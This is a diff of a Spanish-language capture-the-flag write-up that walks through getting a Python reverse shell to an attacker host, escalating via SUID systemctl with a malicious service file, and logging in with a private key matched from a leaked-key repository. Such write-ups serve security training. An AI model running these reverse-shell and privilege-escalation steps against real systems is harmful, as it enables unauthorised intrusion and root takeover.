@@ -105,82 +105,82 @@ En mi terminal levante un listener con netcat
 
 ```nc -lvnp 3000```
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/22.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/23.png)
 
 Me fui a mirar si había alguna versión de python instalado en la máquina
 
 ```which python3```
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/23.png)
-
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/24.png)
 
 Le di con el siguiente comando para obtener una reverse shell
 
+```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/24.png)
 
 Y pude lograr la deseada reverse shell
 
 ![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/25.png)
 
+
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/26.png)
+
 Antes de ir por la flag de usuario quize enumerar más la maquina para poder tener mas claro,
 como podría escalar privilegios y lograr ser root, me fui a la vieja y confiable.. el cheatsheet de g0tm1lk.
 Tras varios copy paste llegue a la parte de los SUID
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/26.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/27.png)
 
 Tras ejecutar el comando noté que **systemctl**, estaba con el bit de SUID, que tsutsa..
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/27.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/28.png)
 
 Ahora en GTFOBins busqué el pinche binario y para suerte mia existia un método de escalación utilizando systemctl + SUID
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/28.png)
-
 ![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/29.png)
-
-Ya tenia mi vector para escalar privilegios, asi que me fui a sacar la flag del user
 
 ![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/30.png)
 
-Hice paso a paso, modificando un poco lo que decia en GTFOBins, cree un archivo test.service
-le puse la estrucura básica de un servicio de windows...
+Ya tenia mi vector para escalar privilegios, asi que me fui a sacar la flag del user
 
 ![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/31.png)
 
-Levante nuevamente un listener en mi máquina...
+Luego hice paso a paso, modificando un poco lo que decia en GTFOBins, cree un archivo test.service
+le puse la estrucura básica de un servicio de windows...
 
 ![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/32.png)
+
+Levante nuevamente un listener en mi máquina...
+
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/33.png)
 
 Hice una copia del systemctl, nose porqué, pero en GTFOBins decia que había que hacerlo... XD
 Y cuando quize obtener mi reverse shell.... **Failed to link unit: Interactive authentication required**
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/33.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/34.png)
 
 :c Que w3a... maldito www-data.. Pero filo, había un archivo que no había mirado en el home del usuario ubuntu, **secret.txt**
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/34.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/35.png)
 
 Cuando lo miré dije, *Meh, un llave pública*...
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/35.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/36.png)
 
 Fue en ese momento que aparecieron los cauros @h4tt0r1 y @fjv al rescate, recordaron un repósitorio de llaves privadas..
 Yaaaa yyyyyyy... napo habian hartas..
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/36.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/37.png)
 
 Pero cuando grepearon la llave pública que estaba en **secret.txt**.. ahi estaba la pinche llave privada...
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/37.png)
-
 ![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/38.png)
+
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/39.png)
 
 ```ssh ubuntu@10.4.4.66 -i llavectm```
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/39.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/40.png)
 
 Luego de entrar como el usuario ubuntu, ya tenia enumerado como escalar, 
 asi que nuevamente intente los pasos para crear el servicio..
@@ -189,16 +189,15 @@ asi que nuevamente intente los pasos para crear el servicio..
 /bin/systemctl enable /tmp/test.service
 /bin/systemctl start test.service
 ```
-
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/40.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/41.png)
 
 Me fui corriendo a revisar mi listener y siiiiiiiiiiiii HAAHHAHAHAHAA una shell con el usuario ROOOOOOT
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/41.png)
+![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/42.png)
 
 Y eso.. fui a /root, saque la flag y 300 puntitos mas pa l@s cabr@s..
 
-![alt text](https://github.com/pelaohxc/writeups/raw/master/asdasd/42.png)
+![test](https://raw.githubusercontent.com/pelaohxc/writeups/master/asdasd/46.png)
 
 
 Ese fui mi humilde writeup, espero puedan rescatar algo c:
